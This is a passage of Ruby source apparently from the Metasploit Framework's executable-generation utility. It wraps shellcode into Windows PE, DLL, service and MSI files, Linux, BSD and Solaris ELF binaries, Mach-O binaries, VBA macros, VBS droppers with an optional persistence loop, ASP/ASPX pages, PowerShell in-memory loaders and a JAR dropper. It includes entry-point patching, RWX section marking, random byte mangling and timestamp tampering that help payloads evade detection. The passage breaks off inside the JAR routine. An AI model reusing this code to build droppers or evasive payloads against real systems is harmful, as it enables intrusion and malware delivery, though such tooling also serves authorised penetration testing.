# -*- coding: binary -*-

module Msf
module Util

#
# The class provides methods for creating and encoding executable file
# formats for various platforms. It is a replacement for the previous
# code in Rex::Text
#
class EXE

require 'rex'
require 'rex/peparsey'
require 'rex/pescan'
require 'rex/random_identifier_generator'
require 'rex/zip'
require 'metasm'
require 'digest/sha1'
require 'msf/core/exe/segment_injector'

  ##
  #
  # Helper functions common to multiple generators
  #
  ##

  def self.set_template_default(opts, exe = nil, path = nil)
    # If no path specified, use the default one.
    path ||= File.join(Msf::Config.data_directory, "templates")

    # If there's no default name, we must blow it up.
    if not exe
      raise RuntimeError, 'Ack! Msf::Util::EXE.set_template_default called w/o default exe name!'
    end

    # Use defaults only if nothing is specified
    opts[:template_path] ||= path
    opts[:template] ||= exe

    # Only use the path when the filename contains no separators.
    if not opts[:template].include?(File::SEPARATOR)
      opts[:template] = File.join(opts[:template_path], opts[:template])
    end

    # Check if it exists now
    return if File.file?(opts[:template])

    # If it failed, try the default...
    if opts[:fallback]
      default_template = File.join(path, exe)
      if File.file?(default_template)
        # Perhaps we should warn about falling back to the default?
        opts.merge!({ :fellback => default_template })
        opts[:template] = default_template
      end
    end
  end

  def self.read_replace_script_template(filename, hash_sub)
    template_pathname = File.join(Msf::Config.data_directory, "templates", "scripts", filename)

    template = ''
    File.open(template_pathname, "rb") do |f|
      template = f.read
    end

    return template % hash_sub
  end


  ##
  #
  # Executable generators
  #
  ##

  def self.to_executable(framework, arch, plat, code='', opts={})
    if (arch.index(ARCH_X86))

      if (plat.index(Msf::Module::Platform::Windows))
        return to_win32pe(framework, code, opts)
      end

      if (plat.index(Msf::Module::Platform::Linux))
        return to_linux_x86_elf(framework, code)
      end

      if(plat.index(Msf::Module::Platform::OSX))
        return to_osx_x86_macho(framework, code)
      end

      if(plat.index(Msf::Module::Platform::BSD))
        return to_bsd_x86_elf(framework, code)
      end

      if(plat.index(Msf::Module::Platform::Solaris))
        return to_solaris_x86_elf(framework, code)
      end

      # XXX: Add remaining x86 systems here
    end

    if( arch.index(ARCH_X86_64) or arch.index( ARCH_X64 ) )
      if (plat.index(Msf::Module::Platform::Windows))
        return to_win64pe(framework, code, opts)
      end

      if (plat.index(Msf::Module::Platform::Linux))
        return to_linux_x64_elf(framework, code, opts)
      end

      if (plat.index(Msf::Module::Platform::OSX))
        return to_osx_x64_macho(framework, code)
      end
    end

    if(arch.index(ARCH_ARMLE))
      if(plat.index(Msf::Module::Platform::OSX))
        return to_osx_arm_macho(framework, code)
      end

      if(plat.index(Msf::Module::Platform::Linux))
        return to_linux_armle_elf(framework, code)
      end

      # XXX: Add remaining ARMLE systems here
    end

    if(arch.index(ARCH_PPC))
      if(plat.index(Msf::Module::Platform::OSX))
        return to_osx_ppc_macho(framework, code)
      end
      # XXX: Add PPC OS X and Linux here
    end

    if(arch.index(ARCH_MIPSLE))
      if(plat.index(Msf::Module::Platform::Linux))
        return to_linux_mipsle_elf(framework, code)
      end
      # XXX: Add remaining MIPSLE systems here
    end

    if(arch.index(ARCH_MIPSBE))
      if(plat.index(Msf::Module::Platform::Linux))
        return to_linux_mipsbe_elf(framework, code)
      end
      # XXX: Add remaining MIPSLE systems here
    end
    nil
  end

  def self.to_win32pe(framework, code, opts={})

    # For backward compatability, this is roughly equivalent to 'exe-small' fmt
    if opts[:sub_method]
      if opts[:inject]
        raise RuntimeError, 'NOTE: using the substitution method means no inject support'
      end

      # use
      return self.to_win32pe_exe_sub(framework, code, opts)
    end

    # Allow the user to specify their own EXE template
    set_template_default(opts, "template_x86_windows.exe")

    # Copy the code to a new RWX segment to allow for self-modifying encoders
    payload = win32_rwx_exec(code)

    # Create a new PE object and run through sanity checks
    fsize = File.size(opts[:template])
    pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
    text = nil
    pe.sections.each do |sec|
      text = sec if sec.name == ".text"
    end

    #try to inject code into executable by adding a section without affecting executable behavior
    if(opts[:inject])
      injector = Msf::Exe::SegmentInjector.new({
          :payload  => code,
          :template => opts[:template],
          :arch     => :x86
      })
      exe = injector.generate_pe
      return exe
    end

    if(not text)
      raise RuntimeError, "No .text section found in the template"
    end

    if ! text.contains_rva?(pe.hdr.opt.AddressOfEntryPoint)
      raise RuntimeError, "The .text section does not contain an entry point"
    end

    p_length = payload.length + 256
    if(text.size < p_length)
      fname = ::File.basename(opts[:template])
      msg  = "The .text section for '#{fname}' is too small. "
      msg << "Minimum is #{p_length.to_s} bytes, your .text section is #{text.size.to_s} bytes"
      raise RuntimeError, msg
    end

    # Store some useful offsets
    off_ent = pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint)
    off_beg = pe.rva_to_file_offset(text.base_rva)

    # We need to make sure our injected code doesn't conflict with the
    # the data directories stored in .text (import, export, etc)
    mines = []
    pe.hdr.opt['DataDirectory'].each do |dir|
      next if dir.v['Size'] == 0
      next if not text.contains_rva?( dir.v['VirtualAddress'] )
      mines << [ pe.rva_to_file_offset(dir.v['VirtualAddress']) - off_beg, dir.v['Size'] ]
    end

    # Break the text segment into contiguous blocks
    blocks = []
    bidx   = 0
    mines.sort{|a,b| a[0] <=> b[0]}.each do |mine|
      bbeg = bidx
      bend = mine[0]
      if(bbeg != bend)
        blocks << [bidx, bend-bidx]
      end
      bidx = mine[0] + mine[1]
    end

    # Add the ending block
    if(bidx < text.size - 1)
      blocks << [bidx, text.size - bidx]
    end

    # Find the largest contiguous block
    blocks.sort!{|a,b| b[1]<=>a[1]}
    block = blocks[0]

    # TODO: Allow the entry point in a different block
    if(payload.length + 256 > block[1])
      raise RuntimeError, "The largest block in .text does not have enough contiguous space (need:#{payload.length+256} found:#{block[1]})"
    end

    # Make a copy of the entire .text section
    data = text.read(0,text.size)

    # Pick a random offset to store the payload
    poff = rand(block[1] - payload.length - 256)

    # Flip a coin to determine if EP is before or after
    eloc = rand(2)
    eidx = nil

    # Pad the entry point with random nops
    entry = generate_nops(framework, [ARCH_X86], rand(200)+51)

    # Pick an offset to store the new entry point
    if(eloc == 0) # place the entry point before the payload
      poff += 256
      eidx = rand(poff-(entry.length + 5))
    else          # place the entry pointer after the payload
      poff -= 256
      eidx = rand(block[1] - (poff + payload.length)) + poff + payload.length
    end

    # Relative jump from the end of the nops to the payload
    entry += "\xe9" + [poff - (eidx + entry.length + 5)].pack('V')

    # Mangle 25% of the original executable
    1.upto(block[1] / 4) do
      data[ block[0] + rand(block[1]), 1] = [rand(0x100)].pack("C")
    end

    # Patch the payload and the new entry point into the .text
    data[block[0] + poff, payload.length] = payload
    data[block[0] + eidx, entry.length]   = entry

    # Create the modified version of the input executable
    exe = ''
    File.open(opts[:template], 'rb') { |fd|
      exe = fd.read(fd.stat.size)
    }

    exe[ exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = [ text.base_rva + block[0] + eidx ].pack("V")
    exe[off_beg, data.length] = data

    tds = pe.hdr.file.TimeDateStamp
    exe[ exe.index([ tds ].pack('V')), 4] = [tds - rand(0x1000000)].pack("V")

    cks = pe.hdr.opt.CheckSum
    if(cks != 0)
      exe[ exe.index([ cks ].pack('V')), 4] = [0].pack("V")
    end

    pe.close

    exe
  end

  def self.to_winpe_only(framework, code, opts={}, arch="x86")

    if arch == ARCH_X86_64
      arch = ARCH_X64
    end

    # Allow the user to specify their own EXE template
    set_template_default(opts, "template_"+arch+"_windows.exe")

    pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)

    exe = ''
      File.open(opts[:template], 'rb') { |fd|
        exe = fd.read(fd.stat.size)
      }

    sections_header = []
    pe._file_header.v['NumberOfSections'].times { |i| sections_header << [(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18+0x24),exe[(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18),0x28]] }


    #look for section with entry point
    sections_header.each do |sec|
      virtualAddress = sec[1][0xc,0x4].unpack('L')[0]
      sizeOfRawData = sec[1][0x10,0x4].unpack('L')[0]
      characteristics = sec[1][0x24,0x4].unpack('L')[0]
      if pe.hdr.opt.AddressOfEntryPoint >= virtualAddress && pe.hdr.opt.AddressOfEntryPoint < virtualAddress+sizeOfRawData
        #put this section writable
        characteristics|=0x80000000
        newcharacteristics = [characteristics].pack('L')
        exe[sec[0],newcharacteristics.length]=newcharacteristics
      end
    end

    #put the shellcode at the entry point, overwriting template
    exe[pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint),code.length]=code

    return exe
  end

  def self.to_win32pe_old(framework, code, opts={})

    payload = code.dup
    # Allow the user to specify their own EXE template
    set_template_default(opts, "template_x86_windows_old.exe")

    pe = ''
    File.open(opts[:template], "rb") { |fd|
      pe = fd.read(fd.stat.size)
    }

    if(payload.length <= 2048)
      payload << Rex::Text.rand_text(2048-payload.length)
    else
      raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
    end

    bo = pe.index('PAYLOAD:')
    raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing \"PAYLOAD:\" tag" if not bo
    pe[bo, payload.length] = payload

    pe[136, 4] = [rand(0x100000000)].pack('V')

    ci = pe.index("\x31\xc9" * 160)
    raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing first \"\\x31\\xc9\"" if not ci
    cd = pe.index("\x31\xc9" * 160, ci + 320)
    raise RuntimeError, "Invalid Win32 PE OLD EXE template: missing second \"\\x31\\xc9\"" if not cd
    rc = pe[ci+320, cd-ci-320]

    # 640 + rc.length bytes of room to store an encoded rc at offset ci
    enc = encode_stub(framework, [ARCH_X86], rc, ::Msf::Module::PlatformList.win32)
    lft = 640+rc.length - enc.length

    buf = enc + Rex::Text.rand_text(640+rc.length - enc.length)
    pe[ci, buf.length] = buf

    # Make the data section executable
    xi = pe.index([0xc0300040].pack('V'))
    pe[xi,4] = [0xe0300020].pack('V')

    # Add a couple random bytes for fun
    pe << Rex::Text.rand_text(rand(64)+4)

    return pe
  end

  def self.exe_sub_method(code,opts ={})

    pe = ''
    File.open(opts[:template], "rb") { |fd|
      pe = fd.read(fd.stat.size)
    }

    case opts[:exe_type]
      when :service_exe
        max_length = 8192
        name = opts[:servicename]

        if name
          bo = pe.index('SERVICENAME')
          raise RuntimeError, "Invalid PE Service EXE template: missing \"SERVICENAME\" tag" if not bo
          pe[bo, 11] = [name].pack('a11')
        end

        if not opts[:sub_method]
          pe[136, 4] = [rand(0x100000000)].pack('V')
        end
      when :dll
        max_length = 2048
      when :exe_sub
        max_length = 4096
    end

    bo = pe.index('PAYLOAD:')
    raise RuntimeError, "Invalid PE EXE subst template: missing \"PAYLOAD:\" tag" if not bo

    if (code.length <= max_length)
      pe[bo, code.length] = [code].pack("a*")
    else
      raise RuntimeError, "The EXE generator now has a max size of #{max_length} bytes, please fix the calling module"
    end

    if opts[:exe_type] == :dll
      mt = pe.index('MUTEX!!!')
      pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
    end

    return pe
  end

  def self.to_win32pe_exe_sub(framework, code, opts={})
    # Allow the user to specify their own DLL template
    set_template_default(opts, "template_x86_windows.exe")
    opts[:exe_type] = :exe_sub
    exe_sub_method(code,opts)
  end

  def self.to_win64pe(framework, code, opts={})
    # Allow the user to specify their own EXE template
    set_template_default(opts, "template_x64_windows.exe")
    #try to inject code into executable by adding a section without affecting executable behavior
    if(opts[:inject])
      injector = Msf::Exe::SegmentInjector.new({
         :payload  => code,
         :template => opts[:template],
         :arch     => :x64
      })
      exe = injector.generate_pe
      return exe
    end
    opts[:exe_type] = :exe_sub
    exe_sub_method(code,opts)
  end

  def self.to_win32pe_service(framework, code, opts={})
    # Allow the user to specify their own service EXE template
    set_template_default(opts, "template_x86_windows_svc.exe")
    opts[:exe_type] = :service_exe
    exe_sub_method(code,opts)
  end

  def self.to_win64pe_service(framework, code, opts={})
    # Allow the user to specify their own service EXE template
    set_template_default(opts, "template_x64_windows_svc.exe")
    opts[:exe_type] = :service_exe
    exe_sub_method(code,opts)
  end

  def self.to_win32pe_dll(framework, code, opts={})
    # Allow the user to specify their own DLL template
    set_template_default(opts, "template_x86_windows.dll")
    opts[:exe_type] = :dll
    exe_sub_method(code,opts)
  end

  def self.to_win64pe_dll(framework, code, opts={})
    # Allow the user to specify their own DLL template
    set_template_default(opts, "template_x64_windows.dll")
    opts[:exe_type] = :dll
    exe_sub_method(code,opts)
  end

  #
  #   Wraps an executable inside a Windows
  #    .msi file for auto execution when run
  #
  def self.to_exe_msi(framework, exe, opts={})
    if opts[:uac]
      opts[:msi_template] ||= "template_windows.msi"
    else
      opts[:msi_template] ||= "template_nouac_windows.msi"
    end
    return replace_msi_buffer(exe, opts)
  end

  def self.replace_msi_buffer(pe, opts)
    opts[:msi_template_path] ||= File.join(Msf::Config.data_directory, "templates")

    if opts[:msi_template].include?(File::SEPARATOR)
      template = opts[:msi_template]
    else
      template = File.join(opts[:msi_template_path], opts[:msi_template])
    end

    msi = ''
    File.open(template, "rb") { |fd|
      msi = fd.read(fd.stat.size)
    }

    section_size =	2**(msi[30..31].unpack('s')[0])
    sector_allocation_table = msi[section_size..section_size*2].unpack('l*')

    buffer_chain = []
    current_secid = 5	# This is closely coupled with the template provided and ideally
          # would be calculated from the dir stream?

    until current_secid == -2
      buffer_chain << current_secid
      current_secid = sector_allocation_table[current_secid]
    end

    buffer_size = buffer_chain.length * section_size

    if pe.size > buffer_size
      raise RuntimeError, "MSI Buffer is not large enough to hold the PE file"
    end

    pe_block_start = 0
    pe_block_end = pe_block_start + section_size - 1

    buffer_chain.each do |section|
      block_start = section_size * (section + 1)
      block_end = block_start + section_size - 1
      pe_block = [pe[pe_block_start..pe_block_end]].pack("a#{section_size}")
      msi[block_start..block_end] = pe_block
      pe_block_start = pe_block_end + 1
      pe_block_end += section_size
    end

    return msi
  end

  def self.to_osx_arm_macho(framework, code, opts={})

    # Allow the user to specify their own template
    set_template_default(opts, "template_armle_darwin.bin")

    mo = ''
    File.open(opts[:template], "rb") { |fd|
      mo = fd.read(fd.stat.size)
    }

    bo = mo.index('PAYLOAD:')
    raise RuntimeError, "Invalid OSX ArmLE Mach-O template: missing \"PAYLOAD:\" tag" if not bo
    mo[bo, code.length] = code

    return mo
  end

  def self.to_osx_ppc_macho(framework, code, opts={})

    # Allow the user to specify their own template
    set_template_default(opts, "template_ppc_darwin.bin")

    mo = ''
    File.open(opts[:template], "rb") { |fd|
      mo = fd.read(fd.stat.size)
    }

    bo = mo.index('PAYLOAD:')
    raise RuntimeError, "Invalid OSX PPC Mach-O template: missing \"PAYLOAD:\" tag" if not bo
    mo[bo, code.length] = code

    return mo
  end

  def self.to_osx_x86_macho(framework, code, opts={})

    # Allow the user to specify their own template
    set_template_default(opts, "template_x86_darwin.bin")

    mo = ''
    File.open(opts[:template], "rb") { |fd|
      mo = fd.read(fd.stat.size)
    }

    bo = mo.index('PAYLOAD:')
    raise RuntimeError, "Invalid OSX x86 Mach-O template: missing \"PAYLOAD:\" tag" if not bo
    mo[bo, code.length] = code

    return mo
  end

  def self.to_osx_x64_macho(framework, code, opts={})
    set_template_default(opts, "template_x64_darwin.bin")

    macho = ''

    File.open(opts[:template], 'rb') { |fd|
      macho = fd.read(fd.stat.size)
    }

    bin = macho.index('PAYLOAD:')
    raise RuntimeError, "Invalid Mac OS X x86_64 Mach-O template: missing \"PAYLOAD:\" tag" if not bin
    macho[bin, code.length] = code

    return macho
  end

  # Create an ELF executable containing the payload provided in +code+
  #
  # For the default template, this method just appends the payload, checks if
  # the template is 32 or 64 bit and adjusts the offsets accordingly
  # For user-provided templates, modifies the header to mark all executable
  # segments as writable and overwrites the entrypoint (usually _start) with
  # the payload.
  #
  def self.to_exe_elf(framework, opts, template, code, big_endian=false)

    # Allow the user to specify their own template
    set_template_default(opts, template)

    # The old way to do it is like other formats, just overwrite a big
    # block of rwx mem with our shellcode.
    #bo = elf.index( "\x90\x90\x90\x90" * 1024 )
    #co = elf.index( " " * 512 )
    #elf[bo, 2048] = [code].pack('a2048') if bo

    # The new template is just an ELF header with its entry point set to
    # the end of the file, so just append shellcode to it and fixup
    # p_filesz and p_memsz in the header for a working ELF executable.
    elf = ''
    File.open(opts[:template], "rb") { |fd|
      elf = fd.read(fd.stat.size)
    }

    elf << code

    # Check EI_CLASS to determine if the header is 32 or 64 bit
    # Use the proper offsets and pack size
    case elf[4]
    when 1, "\x01" # ELFCLASS32 - 32 bit (ruby 1.8 and 1.9)
      if big_endian
        elf[0x44,4] = [elf.length].pack('N') #p_filesz
        elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
      else # little endian
        elf[0x44,4] = [elf.length].pack('V') #p_filesz
        elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
      end
    when 2, "\x02" # ELFCLASS64 - 64 bit (ruby 1.8 and 1.9)
      if big_endian
        elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
        elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
      else # little endian
        elf[0x60,8] = [elf.length].pack('Q') #p_filesz
        elf[0x68,8] = [elf.length + code.length].pack('Q') #p_memsz
      end
    else
      raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
    end

    return elf
  end

  # Create a 32-bit Linux ELF containing the payload provided in +code+
  def self.to_linux_x86_elf(framework, code, opts={})
    unless opts[:template]
      default = true
    end

    if default
      elf = to_exe_elf(framework, opts, "template_x86_linux.bin", code)
    else
      # If this isn't our normal template, we have to do some fancy
      # header patching to mark the .text section rwx before putting our
      # payload into the entry point.

      # read in the template and parse it
      e = Metasm::ELF.decode_file(opts[:template])

      # This will become a modified copy of the template's original phdr
      new_phdr = Metasm::EncodedData.new
      e.segments.each { |s|
        # Be lazy and mark any executable segment as writable.  Doing
        # it this way means we don't have to care about which one
        # contains .text
        if s.flags.include? "X"
          s.flags += [ "W" ]
        end
        new_phdr << s.encode(e)
      }

      # Copy the original file
      elf = File.open(opts[:template], "rb") {|fd| fd.read(fd.stat.size) }

      # Replace the header with our rwx modified version
      elf[e.header.phoff, new_phdr.data.length] = new_phdr.data

      # Replace code at the entrypoint with our payload
      entry_off = e.addr_to_off(e.label_addr('entrypoint'))
      elf[entry_off, code.length] = code
    end

    return elf
  end

  # Create a 32-bit BSD (test on FreeBSD) ELF containing the payload provided in +code+
  def self.to_bsd_x86_elf(framework, code, opts={})
    elf = to_exe_elf(framework, opts, "template_x86_bsd.bin", code)
    return elf
  end

  # Create a 32-bit Solaris ELF containing the payload provided in +code+
  def self.to_solaris_x86_elf(framework, code, opts={})
    elf = to_exe_elf(framework, opts, "template_x86_solaris.bin", code)
    return elf
  end

  # Create a 64-bit Linux ELF containing the payload provided in +code+
  def self.to_linux_x64_elf(framework, code, opts={})
    elf = to_exe_elf(framework, opts, "template_x64_linux.bin", code)
    return elf
  end

  def self.to_linux_armle_elf(framework, code, opts={})
    elf = to_exe_elf(framework, opts, "template_armle_linux.bin", code)
    return elf
  end

  def self.to_linux_mipsle_elf(framework, code, opts={})
    elf = to_exe_elf(framework, opts, "template_mipsle_linux.bin", code)
    return elf
  end

  def self.to_linux_mipsbe_elf(framework, code, opts={})
    elf = to_exe_elf(framework, opts, "template_mipsbe_linux.bin", code, true)
    return elf
  end

  def self.to_exe_vba(exes='')
    exe = exes.unpack('C*')
    hash_sub = {}
    idx = 0
    maxbytes = 2000
    var_base_idx = 0
    var_base = Rex::Text.rand_text_alpha(5).capitalize

    # First write the macro into the vba file
    hash_sub[:var_magic] = Rex::Text.rand_text_alpha(10).capitalize
    hash_sub[:var_fname] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_fenvi] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_fhand] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_parag] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_itemp] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_btemp] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_appnr] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_index] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_gotmagic] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_farg] = var_base + (var_base_idx+=1).to_s
    hash_sub[:var_stemp] = var_base + (var_base_idx+=1).to_s
    hash_sub[:filename] = Rex::Text.rand_text_alpha(rand(8)+8)

    # Function 1 extracts the binary
    hash_sub[:func_name1] = var_base + (var_base_idx+=1).to_s

    # Function 2 executes the binary
    hash_sub[:func_name2] = var_base + (var_base_idx+=1).to_s

    hash_sub[:data] = ""

    # Writing the bytes of the exe to the file
    1.upto(exe.length) do |pc|
      while(c = exe[idx])
        hash_sub[:data] << "&H#{("%.2x" % c).upcase}"
        if (idx > 1 and (idx % maxbytes) == 0)
          # When maxbytes are written make a new paragrpah
          hash_sub[:data] << "\r\n"
        end
        idx += 1
      end
    end

    return read_replace_script_template("to_exe.vba.template", hash_sub)
  end

  def self.to_vba(framework,code,opts={})
    hash_sub = {}
    hash_sub[:var_myByte]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_myArray]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_rwxpage]  	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_res]      	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_offset] 		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_lpThreadAttributes] = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_dwStackSize]        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_lpStartAddress]     = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_lpParameter]        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_dwCreationFlags]	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_lpThreadID]         = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_lpAddr]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_lSize]              = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_flAllocationType]   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_flProtect]          = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_lDest]	          = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_Source]	 	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
    hash_sub[:var_Length]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize

    # put the shellcode bytes into an array
    hash_sub[:bytes] = Rex::Text.to_vbapplication(code, hash_sub[:var_myArray])

    return read_replace_script_template("to_mem.vba.template", hash_sub)
  end

  def self.to_exe_vbs(exes = '', opts={})
    delay   = opts[:delay]   || 5
    persist = opts[:persist] || false

    hash_sub = {}
    hash_sub[:var_shellcode] = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:exe_filename] = Rex::Text.rand_text_alpha(rand(8)+8) << '.exe'
    hash_sub[:var_fname]   = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_func]    = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_stream]  = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_obj]     = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_shell]   = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)

    hash_sub[:hex_shellcode] = exes.unpack('H*').join('')

    hash_sub[:init] = ""

    if(persist)
      hash_sub[:init] << "Do\r\n"
      hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
      hash_sub[:init] << "WScript.Sleep #{delay * 1000}\r\n"
      hash_sub[:init] << "Loop\r\n"
    else
      hash_sub[:init] << "#{hash_sub[:var_func]}\r\n"
    end

    return read_replace_script_template("to_exe.vbs.template", hash_sub)
  end

  def self.to_exe_asp(exes = '', opts={})
    hash_sub = {}
    hash_sub[:var_bytes]   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
    hash_sub[:var_fname]   = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_func]    = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_stream]  = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_obj]     = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_shell]   = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)

    hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])

    return read_replace_script_template("to_exe.asp.template", hash_sub)
  end

  def self.to_exe_aspx(exes = '', opts={})
    hash_sub = {}
    hash_sub[:var_file] 	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_tempdir] 	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_basedir]	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_filename] = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_tempexe] 	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_iterator] = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_proc]	= Rex::Text.rand_text_alpha(rand(8)+8)

    hash_sub[:shellcode] = Rex::Text.to_csharp(exes,100,hash_sub[:var_file])

    return read_replace_script_template("to_exe.aspx.template", hash_sub)
  end

  def self.to_mem_aspx(framework, code, exeopts={})
    # Intialize rig and value names
    rig = Rex::RandomIdentifierGenerator.new()
    rig.init_var(:var_funcAddr)
    rig.init_var(:var_hThread)
    rig.init_var(:var_pInfo)
    rig.init_var(:var_threadId)
    rig.init_var(:var_bytearray)

    hash_sub = rig.to_h
    hash_sub[:shellcode] = Rex::Text.to_csharp(code, 100, rig[:var_bytearray])
  
    return read_replace_script_template("to_mem.aspx.template", hash_sub)
  end

  def self.to_win32pe_psh_net(framework, code, opts={})
    hash_sub = {}
    hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_kernel32] 	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_baseaddr] 	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_threadHandle] 	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_output] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_temp] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_codeProvider] 	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_compileParams] 	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)

    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)

    return read_replace_script_template("to_mem_dotnet.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
  end

  def self.to_win32pe_psh(framework, code, opts={})
    hash_sub = {}
    hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_win32_func]	= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_payload] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_size] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_rwx] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_iter] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])

    return read_replace_script_template("to_mem_old.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
  end

  #
  # Reflection technique prevents the temporary .cs file being created for the .NET compiler
  # Tweaked by shellster
  # Originally from PowerSploit
  #
  def self.to_win32pe_psh_reflection(framework, code, opts={})
    # Intialize rig and value names
    rig = Rex::RandomIdentifierGenerator.new()
    rig.init_var(:func_get_proc_address)
    rig.init_var(:func_get_delegate_type)
    rig.init_var(:var_code)
    rig.init_var(:var_module)
    rig.init_var(:var_procedure)
    rig.init_var(:var_unsafe_native_methods)
    rig.init_var(:var_parameters)
    rig.init_var(:var_return_type)
    rig.init_var(:var_type_builder)
    rig.init_var(:var_buffer)
    rig.init_var(:var_memset)
    rig.init_var(:var_hthread)

    hash_sub = rig.to_h

    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)

    return read_replace_script_template("to_mem_pshreflection.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
  end

  def self.to_win32pe_vbs(framework, code, opts={})
    to_exe_vbs(to_win32pe(framework, code, opts), opts)
  end

  # Creates a jar file that drops the provided +exe+ into a random file name
  # in the system's temp dir and executes it.
  #
  # @see Msf::Payload::Java
  #
  # @return [Rex::Zip::Jar]
  def self.to_jar(exe, opts={})
    spawn = opts[:spawn] || 2
    exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
    zip = Rex::Zip::Jar.new
    paths = [
      [ "metasploit", "Payload.class" ],
    ]
    zip.add_files(paths, File.join(Msf::Config.data_directory, "java"))
